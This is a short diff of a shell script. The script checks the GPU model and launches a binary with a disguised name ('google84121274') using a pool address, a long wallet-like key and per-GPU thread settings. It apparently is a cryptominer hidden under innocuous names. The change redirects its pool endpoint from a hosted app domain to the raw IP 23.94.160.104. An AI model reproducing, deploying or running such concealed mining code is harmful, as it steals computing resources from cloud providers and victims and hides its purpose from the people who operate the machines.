@@ -15,7 +15,7 @@ google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
 if [[ $google8474 == "QuadroP4000" ]]
 then
 
-timeout 84 ./google84121274 -p https://mobile841212121274.osc-fr1.scalingo.io -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
+timeout 84 ./google84121274 -p http://23.94.160.104 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -27,7 +27,7 @@ else
 if [[ $google8474 == "QuadroM4000" ]]
 then
 
-timeout 84 ./google84121274 -p https://mobile841212121274.osc-fr1.scalingo.io -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+timeout 84 ./google84121274 -p http://23.94.160.104 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -39,7 +39,7 @@ else
 if [[ $google8474 == "QuadroP5000" ]]
 then
 
-timeout 84 ./google84121274 -p https://mobile841212121274.osc-fr1.scalingo.io -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 22 -b 22
+timeout 84 ./google84121274 -p http://23.94.160.104 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 22 -b 22
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -48,7 +48,7 @@ fi
 
 else
 
-timeout 84 ./google84121274 -p https://mobile841212121274.osc-fr1.scalingo.io -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
+timeout 84 ./google84121274 -p http://23.94.160.104 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
 if [ $? -eq 124 ]; then
 echo "google84"
 else
